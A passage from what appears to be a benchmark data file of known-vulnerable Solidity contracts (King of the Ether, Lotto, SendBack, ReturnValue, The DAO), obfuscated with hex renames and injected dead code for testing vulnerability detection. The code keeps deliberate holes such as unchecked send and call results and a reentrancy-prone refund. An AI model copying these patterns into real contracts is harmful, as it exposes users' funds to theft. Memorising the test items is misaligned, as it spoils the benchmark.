1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant _0xd5f3e3 = 1;\n    uint constant _0xd68331 = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public _0x76bbdf;\n\n    // The King (or Queen) of the Ether.\n    Monarch public _0x3a4ce3;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public _0xba7dbf;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x59ce65 = msg.sender; }\n        _0x76bbdf = _0xec319a;\n        _0x3a4ce3 = Monarch(\n            _0x59ce65,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function _0xc0b6a7() constant returns (uint n) {\n        return _0xba7dbf.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address _0xf84296,\n        string _0x045fab,\n        uint _0x307162\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        _0xb97bb0(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function _0xb97bb0(string _0xd550c8) {\n\n        uint _0x639830 = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (_0x639830 < _0x76bbdf) {\n            msg.sender.send(_0x639830);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (_0x639830 > _0x76bbdf) {\n            uint _0x10ed90 = _0x639830 - _0x76bbdf;\n            msg.sender.send(_0x10ed90);\n            _0x639830 = _0x639830 - _0x10ed90;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint _0x11439e = (_0x639830 * _0xd5f3e3) / _0xd68331;\n\n        uint _0x403b14 = _0x639830 - _0x11439e;\n\n        if (_0x3a4ce3._0xf4dfc4 != _0x59ce65) {\n            _0x3a4ce3._0xf4dfc4.send(_0x403b14);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        _0xba7dbf.push(_0x3a4ce3);\n        _0x3a4ce3 = Monarch(\n            msg.sender,\n            _0xd550c8,\n            _0x639830,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint _0x84ef4c = _0x76bbdf * _0x3ba64c / _0x3ab67d;\n        if (_0x84ef4c < 10 finney) {\n            if (block.timestamp > 0) { _0x76bbdf = _0x84ef4c; }\n        } else if (_0x84ef4c < 100 finney) {\n            _0x76bbdf = 100 szabo * (_0x84ef4c / 100 szabo);\n        } else if (_0x84ef4c < 1 ether) {\n            _0x76bbdf = 1 finney * (_0x84ef4c / 1 finney);\n        } else if (_0x84ef4c < 10 ether) {\n            _0x76bbdf = 10 finney * (_0x84ef4c / 10 finney);\n        } else if (_0x84ef4c < 100 ether) {\n            _0x76bbdf = 100 finney * (_0x84ef4c / 100 finney);\n        } else if (_0x84ef4c < 1000 ether) {\n            _0x76bbdf = 1 ether * (_0x84ef4c / 1 ether);\n        } else if (_0x84ef4c < 10000 ether) {\n            if (1 == 1) { _0x76bbdf = 10 ether * (_0x84ef4c / 10 ether); }\n        } else {\n            if (block.timestamp > 0) { _0x76bbdf = _0x84ef4c; }\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(_0x3a4ce3._0xf4dfc4, _0x3a4ce3._0xd550c8, _0x76bbdf);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function _0x16bc1c(uint _0x62caaa) _0x50fdcd {\n        _0x59ce65.send(_0x62caaa);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function _0x64c049(address _0x84000e) _0x50fdcd {\n        _0x59ce65 = _0x84000e;\n    }\n\n}\n",
      "rename_map": {
        "wizardCommissionFractionNum": "_0xd5f3e3",
        "wizardCommissionFractionDen": "_0xd68331",
        "claimPriceAdjustDen": "_0x3ab67d",
        "coronationTimestamp": "_0xe8b38f",
        "usurperEtherAddress": "_0xf84296",
        "claimPriceAdjustNum": "_0x3ba64c",
        "startingClaimPrice": "_0xec319a",
        "transferOwnership": "_0x64c049",
        "currentClaimPrice": "_0x76bbdf",
        "rawNewClaimPrice": "_0x84ef4c",
        "numberOfMonarchs": "_0xc0b6a7",
        "wizardCommission": "_0x11439e",
        "sweepCommission": "_0x16bc1c",
        "currentMonarch": "_0x3a4ce3",
        "wizardAddress": "_0x59ce65",
        "newClaimPrice": "_0x307162",
        "etherAddress": "_0xf4dfc4",
        "pastMonarchs": "_0xba7dbf",
        "compensation": "_0x403b14",
        "usurperName": "_0x045fab",
        "claimThrone": "_0xb97bb0",
        "onlywizard": "_0x50fdcd",
        "claimPrice": "_0x1475b7",
        "excessPaid": "_0x10ed90",
        "valuePaid": "_0x639830",
        "newOwner": "_0x84000e",
        "amount": "_0x62caaa",
        "name": "_0xd550c8"
      },
      "changes": [
        "Renamed 28 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_085",
      "transformed_id": "ss_l4_medium_sn_ds_085",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\n contract Lotto {\n\n     bool public _0x816e74 = false;\n     address public _0x2714bc;\n     uint public _0x6c0db0;\n\n     // ... extra functionality here\n\n     function _0xfa70fe() public {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n         require(!_0x816e74);\n         _0x2714bc.send(_0x6c0db0);\n         _0x816e74 = true;\n     }\n\n     function _0x93b394() public {\n        uint256 _unused3 = 0;\n        bool _flag4 = false;\n         require(_0x816e74);\n         msg.sender.send(this.balance);\n     }\n }",
      "rename_map": {
        "withdrawLeftOver": "_0x93b394",
        "sendToWinner": "_0xfa70fe",
        "winAmount": "_0x6c0db0",
        "payedOut": "_0x816e74",
        "winner": "_0x2714bc"
      },
      "changes": [
        "Renamed 5 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_086",
      "transformed_id": "ss_l4_medium_sn_ds_086",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.0;\ncontract SendBack {\n    mapping (address => uint) _0x6659ab;\n    function _0x0c01e9() {\n\t\tuint _0x83f170 = _0x6659ab[msg.sender];\n\t\t_0x6659ab[msg.sender] = 0;\n\t\tmsg.sender.send(_0x83f170);\n\t}\n}",
      "rename_map": {
        "amountToWithdraw": "_0x83f170",
        "withdrawBalance": "_0x0c01e9",
        "userBalances": "_0x6659ab"
      },
      "changes": [
        "Renamed 3 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_087",
      "transformed_id": "ss_l4_medium_sn_ds_087",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.4.25;\n\ncontract ReturnValue {\n\n  function _0x324497(address _0x092410) public {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    require(_0x092410.call());\n  }\n\n  function _0x0938fe(address _0x092410) public {\n        if (false) { revert(); }\n        // Placeholder for future logic\n    _0x092410.call();\n  }\n}",
      "rename_map": {
        "callnotchecked": "_0x0938fe",
        "callchecked": "_0x324497",
        "callee": "_0x092410"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_113",
      "transformed_id": "ss_l4_medium_sn_ds_113",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// 0xbb9bc244d798123fde783fcc1c72d3bb8c189413#code\n\n/// @title Standard Token Contract.\n\ncontract TokenInterface {\n    mapping (address => uint256) _0x0c2f1d;\n    mapping (address => mapping (address => uint256)) _0xa8843b;\n\n    /// Total amount of tokens\n    uint256 public _0xe90ca9;\n\n    /// @param _owner The address from which the balance will be retrieved\n    /// @return The balance\n    function _0xf06056(address _0xdc7af5) constant returns (uint256 balance);\n\n    /// @notice Send `_amount` tokens to `_to` from `msg.sender`\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transferred\n    /// @return Whether the transfer was successful or not\n    function transfer(address _0x4ecdd8, uint256 _0xe1f257) returns (bool _0xde260f);\n\n    /// @notice Send `_amount` tokens to `_to` from `_from` on the condition it\n    /// is approved by `_from`\n    /// @param _from The address of the origin of the transfer\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transferred\n    /// @return Whether the transfer was successful or not\n    function _0xdcc9dc(address _0xac3031, address _0x4ecdd8, uint256 _0xe1f257) returns (bool _0xde260f);\n\n    /// @notice `msg.sender` approves `_spender` to spend `_amount` tokens on\n    /// its behalf\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @param _amount The amount of tokens to be approved for transfer\n    /// @return Whether the approval was successful or not\n    function _0xe9ed2a(address _0xa17e1e, uint256 _0xe1f257) returns (bool _0xde260f);\n\n    /// @param _owner The address of the account owning tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @return Amount of remaining tokens of _owner that _spender is allowed\n    /// to spend\n    function _0x200f84(\n        address _0xdc7af5,\n        address _0xa17e1e\n    ) constant returns (uint256 _0x08ecc4);\n\n    event Transfer(address indexed _0xac3031, address indexed _0x4ecdd8, uint256 _0xe1f257);\n    event Approval(\n        address indexed _0xdc7af5,\n        address indexed _0xa17e1e,\n        uint256 _0xe1f257\n    );\n}\n\ncontract Token is TokenInterface {\n    // Protects users by preventing the execution of method calls that\n    // inadvertently also transferred ether\n    modifier _0xe5b5da() {if (msg.value > 0) throw; _;}\n\n    function _0xf06056(address _0xdc7af5) constant returns (uint256 balance) {\n        return _0x0c2f1d[_0xdc7af5];\n    }\n\n    function transfer(address _0x4ecdd8, uint256 _0xe1f257) _0xe5b5da returns (bool _0xde260f) {\n        if (_0x0c2f1d[msg.sender] >= _0xe1f257 && _0xe1f257 > 0) {\n            _0x0c2f1d[msg.sender] -= _0xe1f257;\n            _0x0c2f1d[_0x4ecdd8] += _0xe1f257;\n            Transfer(msg.sender, _0x4ecdd8, _0xe1f257);\n            return true;\n        } else {\n           return false;\n        }\n    }\n\n    function _0xdcc9dc(\n        address _0xac3031,\n        address _0x4ecdd8,\n        uint256 _0xe1f257\n    ) _0xe5b5da returns (bool _0xde260f) {\n\n        if (_0x0c2f1d[_0xac3031] >= _0xe1f257\n            && _0xa8843b[_0xac3031][msg.sender] >= _0xe1f257\n            && _0xe1f257 > 0) {\n\n            _0x0c2f1d[_0x4ecdd8] += _0xe1f257;\n            _0x0c2f1d[_0xac3031] -= _0xe1f257;\n            _0xa8843b[_0xac3031][msg.sender] -= _0xe1f257;\n            Transfer(_0xac3031, _0x4ecdd8, _0xe1f257);\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function _0xe9ed2a(address _0xa17e1e, uint256 _0xe1f257) returns (bool _0xde260f) {\n        _0xa8843b[msg.sender][_0xa17e1e] = _0xe1f257;\n        Approval(msg.sender, _0xa17e1e, _0xe1f257);\n        return true;\n    }\n\n    function _0x200f84(address _0xdc7af5, address _0xa17e1e) constant returns (uint256 _0x08ecc4) {\n        return _0xa8843b[_0xdc7af5][_0xa17e1e];\n    }\n}\n\ncontract ManagedAccountInterface {\n    // The only address with permission to withdraw from this account\n    address public _0xa92fda;\n    // If true, only the owner of the account can receive ether from it\n    bool public _0x014b70;\n    // The sum of ether (in wei) which has been sent to this contract\n    uint public _0x4edb1b;\n\n    /// @notice Sends `_amount` of wei to _recipient\n    /// @param _amount The amount of wei to send to `_recipient`\n    /// @param _recipient The address to receive `_amount` of wei\n    /// @return True if the send completed\n    function _0xa1d745(address _0x76f85f, uint _0xe1f257) returns (bool);\n\n    event PayOut(address indexed _0x76f85f, uint _0xe1f257);\n}\n\ncontract ManagedAccount is ManagedAccountInterface{\n\n    // The constructor sets the owner of the account\n    function ManagedAccount(address _0xdc7af5, bool _0x3f4ff8) {\n        _0xa92fda = _0xdc7af5;\n        _0x014b70 = _0x3f4ff8;\n    }\n\n    // When the contract receives a transaction without data this is called.\n    // It counts the amount of ether it receives and stores it in\n    // accumulatedInput.\n    function() {\n        _0x4edb1b += msg.value;\n    }\n\n    function _0xa1d745(address _0x76f85f, uint _0xe1f257) returns (bool) {\n        if (msg.sender != _0xa92fda || msg.value > 0 || (_0x014b70 && _0x76f85f != _0xa92fda))\n            throw;\n        if (_0x76f85f.call.value(_0xe1f257)()) {\n            PayOut(_0x76f85f, _0xe1f257);\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\ncontract TokenCreationInterface {\n\n    // End of token creation, in Unix time\n    uint public _0x6873fa;\n    // Minimum fueling goal of the token creation, denominated in tokens to\n    // be created\n    uint public _0x51c8a5;\n    // True if the DAO reached its minimum fueling goal, false otherwise\n    bool public _0xbe2a20;\n    // For DAO splits - if privateCreation is 0, then it is a public token\n    // creation, otherwise only the address stored in privateCreation is\n    // allowed to create tokens\n    address public _0xf0746b;\n    // hold extra ether which has been sent after the DAO token\n    // creation rate has increased\n    ManagedAccount public _0xe206d9;\n    // tracks the amount of wei given from each contributor (used for refund)\n    mapping (address => uint256) _0x6304f1;\n\n    /// @dev Constructor setting the minimum fueling goal and the\n    /// end of the Token Creation\n    /// @param _minTokensToCreate Minimum fueling goal in number of\n    ///        Tokens to be created\n    /// @param _closingTime Date (in Unix time) of the end of the Token Creation\n    /// @param _privateCreation Zero means that the creation is public.  A\n    /// non-zero address represents the only address that can create Tokens\n    /// (the address can also create Tokens on behalf of other accounts)\n    // This is the constructor: it can not be overloaded so it is commented out\n    //  function TokenCreation(\n        //  uint _minTokensTocreate,\n        //  uint _closingTime,\n        //  address _privateCreation\n    //  );\n\n    /// @notice Create Token with `_tokenHolder` as the initial owner of the Token\n    /// @param _tokenHolder The address of the Tokens's recipient\n    /// @return Whether the token creation was successful\n    function _0xbbfb49(address _0xdfbeb9) returns (bool _0xde260f);\n\n    /// @notice Refund `msg.sender` in the case the Token Creation did\n    /// not reach its minimum fueling goal\n    function _0xbcfb63();\n\n    /// @return The divisor used to calculate the token creation rate during\n    /// the creation phase\n    function _0x3c32e6() constant returns (uint _0x3c32e6);\n\n    event FuelingToDate(uint value);\n    event CreatedToken(address indexed _0x40c5b0, uint _0x19be9d);\n    event Refund(address indexed _0x40c5b0, uint value);\n}\n\ncontract TokenCreation is TokenCreationInterface, Token {\n    function TokenCreation(\n        uint _0xe0641a,\n        uint _0xd42887,\n        address _0xa5f5d6) {\n\n        _0x6873fa = _0xd42887;\n        _0x51c8a5 = _0xe0641a;\n        _0xf0746b = _0xa5f5d6;\n        _0xe206d9 = new ManagedAccount(address(this), true);\n    }\n\n    function _0xbbfb49(address _0xdfbeb9) returns (bool _0xde260f) {\n        if (_0x161ca9 < _0x6873fa && msg.value > 0\n            && (_0xf0746b == 0 || _0xf0746b == msg.sender)) {\n\n            uint _0xb71683 = (msg.value * 20) / _0x3c32e6();\n            _0xe206d9.call.value(msg.value - _0xb71683)();\n            _0x0c2f1d[_0xdfbeb9] += _0xb71683;\n            _0xe90ca9 += _0xb71683;\n            _0x6304f1[_0xdfbeb9] += msg.value;\n            CreatedToken(_0xdfbeb9, _0xb71683);\n            if (_0xe90ca9 >= _0x51c8a5 && !_0xbe2a20) {\n                _0xbe2a20 = true;\n                FuelingToDate(_0xe90ca9);\n            }\n            return true;\n        }\n        throw;\n    }\n\n    function _0xbcfb63() _0xe5b5da {\n        if (_0x161ca9 > _0x6873fa && !_0xbe2a20) {\n            // Get extraBalance - will only succeed when called for the first time\n            if (_0xe206d9.balance >= _0xe206d9._0x4edb1b())\n                _0xe206d9._0xa1d745(address(this), _0xe206d9._0x4edb1b());\n\n            // Execute refund\n            if (msg.sender.call.value(_0x6304f1[msg.sender])()) {\n                Refund(msg.sender, _0x6304f1[msg.sender]);\n                _0xe90ca9 -= _0x0c2f1d[msg.sender];\n                _0x0c2f1d[msg.sender] = 0;\n                _0x6304f1[msg.sender] = 0;\n            }\n        }\n    }\n\n    function _0x3c32e6() constant returns (uint _0x3c32e6) {\n        // The number of (base unit) tokens per wei is calculated\n        // as `msg.value` * 20 / `divisor`\n        // The fueling period starts with a 1:1 ratio\n        if (_0x6873fa - 2 weeks > _0x161ca9) {\n            return 20;\n        // Followed by 10 days with a daily creation rate increase of 5%\n        } else if (_0x6873fa - 4 days > _0x161ca9) {\n            return (20 + (_0x161ca9 - (_0x6873fa - 2 weeks)) / (1 days));\n        // The last 4 days there is a constant creation rate ratio of 1:1.5\n        } else {\n            return 30;\n        }\n    }\n}\n\ncontract DAOInterface {\n\n    // The amount of days for which people who try to participate in the\n    // creation by calling the fallback function will still get their ether back\n    uint constant _0x28a77a = 40 days;\n    // The minimum debate period that a generic proposal can have\n    uint constant _0x90e2de = 2 weeks;\n    // The minimum debate period that a split proposal can have\n    uint constant _0x3af767 = 1 weeks;\n    // Period of days inside which it's possible to execute a DAO split\n    uint constant _0x49ce24 = 27 days;\n    // Period of time after which the minimum Quorum is halved\n    uint constant _0x622a4d = 25 weeks;\n    // Period after which a proposal is closed\n    // (used in the case `executeProposal` fails because it throws)\n    uint constant _0x800f67 = 10 days;\n    // Denotes the maximum proposal deposit that can be given. It is given as\n    // a fraction of total Ether spent plus balance of the DAO\n    uint constant _0x860c40 = 100;\n\n    // Proposals to spend the DAO's ether or to choose a new Curator\n    Proposal[] public _0x116b51;\n    // The quorum needed for each proposal is partially calculated by\n    // totalSupply / minQuorumDivisor\n    uint public _0xe76d34;\n    // The unix time of the last time quorum was reached on a proposal\n    uint  public _0x094540;\n\n    // Address of the curator\n    address public _0xdd2d3a;\n    // The whitelist: List of addresses the DAO is allowed to send ether to\n    mapping (address => bool) public _0x6e1876;\n\n    // Tracks the addresses that own Reward Tokens. Those addresses can only be\n    // DAOs that have split from the original DAO. Conceptually, Reward Tokens\n    // represent the proportion of the rewards that the DAO has the right to\n    // receive. These Reward Tokens are generated when the DAO spends ether.\n    mapping (address => uint) public _0x4386bd;\n    // Total supply of rewardToken\n    uint public _0x7b56f6;\n\n    // The account used to manage the rewards which are to be distributed to the\n    // DAO Token Holders of this DAO\n    ManagedAccount public _0xd2e8fe;\n\n    // The account used to manage the rewards which are to be distributed to\n    // any DAO that holds Reward Tokens\n    ManagedAccount public DAOrewardAccount;\n\n    // Amount of rewards (in wei) already paid out to a certain DAO\n    mapping (address => uint) public DAOpaidOut;\n\n    // Amount of rewards (in wei) already paid out to a certain address\n    mapping (address => uint) public _0x20fc25;\n    // Map of addresses blocked during a vote (not allowed to transfer DAO\n    // tokens). The address points to the proposal ID.\n    mapping (address => uint) public _0xa8738c;\n\n    // The minimum deposit (in wei) required to submit any proposal that is not\n    // requesting a new Curator (no deposit is required for splits)\n    uint public _0x6c3814;\n\n    // the accumulated sum of all current proposal deposits\n    uint _0x53a418;\n\n    // Contract that is able to create a new DAO (with the same code as\n    // this one), used for splits\n    DAO_Creator public _0x6ebd70;\n\n    // A proposal with `newCurator == false` represents a transaction\n    // to be issued by this DAO\n    // A proposal with `newCurator == true` represents a DAO split\n    struct Proposal {\n        // The address where the `amount` will go to if the proposal is accepted\n        // or if `newCurator` is true, the proposed Curator of\n        // the new DAO).\n        address _0xc4e315;\n        // The amount to transfer to `recipient` if the proposal is accepted.\n        uint _0x19be9d;\n        // A plain text description of the proposal\n        string _0x2846f7;\n        // A unix timestamp, denoting the end of the voting period\n        uint _0xa0f12b;\n        // True if the proposal's votes have yet to be counted, otherwise False\n        bool _0xce28ae;\n        // True if quorum has been reached, the votes have been counted, and\n        // the majority said yes\n        bool _0x8f4228;\n        // A hash to check validity of a proposal\n        bytes32 _0xa42223;\n        // Deposit in wei the creator added when submitting their proposal. It\n        // is taken from the msg.value of a newProposal call.\n        uint _0x6c3814;\n        // True if this proposal is to assign a new Curator\n        bool _0x3b879f;\n        // Data needed for splitting the DAO\n        SplitData[] _0x5a2263;\n        // Number of Tokens in favor of the proposal\n        uint _0xf745a1;\n        // Number of Tokens opposed to the proposal\n        uint _0xc90e48;\n        // Simple mapping to check if a shareholder has voted for it\n        mapping (address => bool) _0xab382e;\n        // Simple mapping to check if a shareholder has voted against it\n        mapping (address => bool) _0x002872;\n        // Address of the shareholder who created the proposal\n        address _0x2b2d77;\n    }\n\n    // Used only in the case of a newCurator proposal.\n    struct SplitData {\n        // The balance of the current DAO minus the deposit at the time of split\n        uint _0xb0c2d7;\n        // The total amount of DAO Tokens in existence at the time of split.\n        uint _0xe90ca9;\n        // Amount of Reward Tokens owned by the DAO at the time of split.\n        uint _0x4386bd;\n        // The new DAO contract created at the time of split.\n        DAO _0xe8af3a;\n    }\n\n    // Used to restrict access to certain functions to only DAO Token Holders\n    modifier _0x714c90 {}\n\n    /// @dev Constructor setting the Curator and the address\n    /// for the contract able to create another DAO as well as the parameters\n    /// for the DAO Token Creation\n    /// @param _curator The Curator\n    /// @param _daoCreator The contract able to (re)create this DAO\n    /// @param _proposalDeposit The deposit to be paid for a regular proposal\n    /// @param _minTokensToCreate Minimum required wei-equivalent tokens\n    ///        to be created for a successful DAO Token Creation\n    /// @param _closingTime Date (in Unix time) of the end of the DAO Token Creation\n    /// @param _privateCreation If zero the DAO Token Creation is open to public, a\n    /// non-zero address means that the DAO Token Creation is only for the address\n    // This is the constructor: it can not be overloaded so it is commented out\n    //  function DAO(\n        //  address _curator,\n        //  DAO_Creator _daoCreator,\n        //  uint _proposalDeposit,\n        //  uint _minTokensToCreate,\n        //  uint _closingTime,\n        //  address _privateCreation\n    //  );\n\n    /// @notice Create Token with `msg.sender` as the beneficiary\n    /// @return Whether the token creation was successful\n    function () returns (bool _0xde260f);\n\n    /// @dev This function is used to send ether back\n    /// to the DAO, it can also be used to receive payments that should not be\n    /// counted as rewards (donations, grants, etc.)\n    /// @return Whether the DAO received the ether successfully\n    function _0x39ba85() returns(bool);\n\n    /// @notice `msg.sender` creates a proposal to send `_amount` Wei to\n    /// `_recipient` with the transaction data `_transactionData`. If\n    /// `_newCurator` is true, then this is a proposal that splits the\n    /// DAO and sets `_recipient` as the new DAO's Curator.\n    /// @param _recipient Address of the recipient of the proposed transaction\n    /// @param _amount Amount of wei to be sent with the proposed transaction\n    /// @param _description String describing the proposal\n    /// @param _transactionData Data of the proposed transaction\n    /// @param _debatingPeriod Time used for debating a proposal, at least 2\n    /// weeks for a regular proposal, 10 days for new Curator proposal\n    /// @param _newCurator Bool defining whether this proposal is about\n    /// a new Curator or not\n    /// @return The proposal ID. Needed for voting on the proposal\n    function _0x3f6a9c(\n        address _0x76f85f,\n        uint _0xe1f257,\n        string _0xfa4117,\n        bytes _0x665b98,\n        uint _0x28f5f8,\n        bool _0x2c06b9\n    ) _0x714c90 returns (uint _0xe1ee55);\n\n    /// @notice Check that the proposal with the ID `_proposalID` matches the\n    /// transaction which sends `_amount` with data `_transactionData`\n    /// to `_recipient`\n    /// @param _proposalID The proposal ID\n    /// @param _recipient The recipient of the proposed transaction\n    /// @param _amount The amount of wei to be sent in the proposed transaction\n    /// @param _transactionData The data of the proposed transaction\n    /// @return Whether the proposal ID matches the transaction data or not\n    function _0x098d87(\n        uint _0xe1ee55,\n        address _0x76f85f,\n        uint _0xe1f257,\n        bytes _0x665b98\n    ) constant returns (bool _0xf82eda);\n\n    /// @notice Vote on proposal `_proposalID` with `_supportsProposal`\n    /// @param _proposalID The proposal ID\n    /// @param _supportsProposal Yes/No - support of the proposal\n    /// @return The vote ID.\n    function _0x9d6f01(\n        uint _0xe1ee55,\n        bool _0x458854\n    ) _0x714c90 returns (uint _0x045d58);\n\n    /// @notice Checks whether proposal `_proposalID` with transaction data\n    /// `_transactionData` has been voted for or rejected, and executes the\n    /// transaction in the case it has been voted for.\n    /// @param _proposalID The proposal ID\n    /// @param _transactionData The data of the proposed transaction\n    /// @return Whether the proposed transaction has been executed or not\n    function _0x88cf04(\n        uint _0xe1ee55,\n        bytes _0x665b98\n    ) returns (bool _0xf8b324);\n\n    /// @notice ATTENTION! I confirm to move my remaining ether to a new DAO\n    /// with `_newCurator` as the new Curator, as has been\n    /// proposed in proposal `_proposalID`. This will burn my tokens. This can\n    /// not be undone and will split the DAO into two DAO's, with two\n    /// different underlying tokens.\n    /// @param _proposalID The proposal ID\n    /// @param _newCurator The new Curator of the new DAO\n    /// @dev This function, when called for the first time for this proposal,\n    /// will create a new DAO and send the sender's portion of the remaining\n    /// ether and Reward Tokens to the new DAO. It will also burn the DAO Tokens\n    /// of the sender.\n    function _0x5515b0(\n        uint _0xe1ee55,\n        address _0x2c06b9\n    ) returns (bool _0xf8b324);\n\n    /// @dev can only be called by the DAO itself through a proposal\n    /// updates the contract of the DAO by sending all ether and rewardTokens\n    /// to the new DAO. The new DAO needs to be approved by the Curator\n    /// @param _newContract the address of the new contract\n    function _0x19bf77(address _0x3b7ba0);\n\n    /// @notice Add a new possible recipient `_recipient` to the whitelist so\n    /// that the DAO can send transactions to them (using proposals)\n    /// @param _recipient New recipient address\n    /// @dev Can only be called by the current Curator\n    /// @return Whether successful or not\n    function _0xdfeca7(address _0x76f85f, bool _0x8e9f6b) external returns (bool _0xf8b324);\n\n    /// @notice Change the minimum deposit required to submit a proposal\n    /// @param _proposalDeposit The new proposal deposit\n    /// @dev Can only be called by this DAO (through proposals with the\n    /// recipient being this DAO itself)\n    function _0x6c9139(uint _0xa2cc3d) external;\n\n    /// @notice Move rewards from the DAORewards managed account\n    /// @param _toMembers If true rewards are moved to the actual reward account\n    ///                   for the DAO. If not then it's moved to the DAO itself\n    /// @return Whether the call was successful\n    function _0x2f0b78(bool _0xd120e7) external returns (bool _0xf8b324);\n\n    /// @notice Get my portion of the reward that was sent to `rewardAccount`\n    /// @return Whether the call was successful\n    function _0x50da57() returns(bool _0xf8b324);\n\n    /// @notice Withdraw `_account`'s portion of the reward from `rewardAccount`\n    /// to `_account`'s balance\n    /// @return Whether the call was successful\n    function _0x11768a(address _0x8feb49) internal returns (bool _0xf8b324);\n\n    /// @notice Send `_amount` tokens to `_to` from `msg.sender`. Prior to this\n    /// getMyReward() is called.\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transfered\n    /// @return Whether the transfer was successful or not\n    function _0xf38620(address _0x4ecdd8, uint256 _0xe1f257) returns (bool _0xde260f);\n\n    /// @notice Send `_amount` tokens to `_to` from `_from` on the condition it\n    /// is approved by `_from`. Prior to this getMyReward() is called.\n    /// @param _from The address of the sender\n    /// @param _to The address of the recipient\n    /// @param _amount The amount of tokens to be transfered\n    /// @return Whether the transfer was successful or not\n    function _0x3e6edf(\n        address _0xac3031,\n        address _0x4ecdd8,\n        uint256 _0xe1f257\n    ) returns (bool _0xde260f);\n\n    /// @notice Doubles the 'minQuorumDivisor' in the case quorum has not been\n    /// achieved in 52 weeks\n    /// @return Whether the change was successful or not\n    function _0xcf9a70() returns (bool _0xf8b324);\n\n    /// @return total number of proposals ever created\n    function _0x92d8bb() constant returns (uint _0x188774);\n\n    /// @param _proposalID Id of the new curator proposal\n    /// @return Address of the new DAO\n    function _0xcae6ff(uint _0xe1ee55) constant returns (address _0x334c6b);\n\n    /// @param _account The address of the account which is checked.\n    /// @return Whether the account is blocked (not allowed to transfer tokens) or not.\n    function _0x624a93(address _0x8feb49) internal returns (bool);\n\n    /// @notice If the caller is blocked by a proposal whose voting deadline\n    /// has exprired then unblock him.\n    /// @return Whether the account is blocked (not allowed to transfer tokens) or not.\n    function _0x2542a5() returns (bool);\n\n    event ProposalAdded(\n        uint indexed _0x875e7e,\n        address _0xc4e315,\n        uint _0x19be9d,\n        bool _0x3b879f,\n        string _0x2846f7\n    );\n    event Voted(uint indexed _0x875e7e, bool _0x9d8847, address indexed _0xa2fbfd);\n    event ProposalTallied(uint indexed _0x875e7e, bool _0xcad050, uint _0x68a262);\n    event NewCurator(address indexed _0x2c06b9);\n    event AllowedRecipientChanged(address indexed _0x76f85f, bool _0x8e9f6b);\n}\n\n// The DAO contract itself\ncontract DAO is DAOInterface, Token, TokenCreation {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n\n    // Modifier that allows only shareholders to vote and create new proposals\n    modifier _0x714c90 {\n        if (_0xf06056(msg.sender) == 0) throw;\n            _;\n    }\n\n    function DAO(\n        address _0xb67c0e,\n        DAO_Creator _0x3a1db8,\n        uint _0xa2cc3d,\n        uint _0xe0641a,\n        uint _0xd42887,\n        address _0xa5f5d6\n    ) TokenCreation(_0xe0641a, _0xd42887, _0xa5f5d6) {\n\n        _0xdd2d3a = _0xb67c0e;\n        _0x6ebd70 = _0x3a1db8;\n        _0x6c3814 = _0xa2cc3d;\n        _0xd2e8fe = new ManagedAccount(address(this), false);\n        DAOrewardAccount = new ManagedAccount(address(this), false);\n        if (address(_0xd2e8fe) == 0)\n            throw;\n        if (address(DAOrewardAccount) == 0)\n            throw;\n        _0x094540 = _0x161ca9;\n        _0xe76d34 = 5; // sets the minimal quorum to 20%\n        _0x116b51.length = 1; // avoids a proposal with ID 0 because it is used\n\n        _0x6e1876[address(this)] = true;\n        _0x6e1876[_0xdd2d3a] = true;\n    }\n\n    function () returns (bool _0xde260f) {\n        if (_0x161ca9 < _0x6873fa + _0x28a77a && msg.sender != address(_0xe206d9))\n            return _0xbbfb49(msg.sender);\n        else\n            return _0x39ba85();\n    }\n\n    function 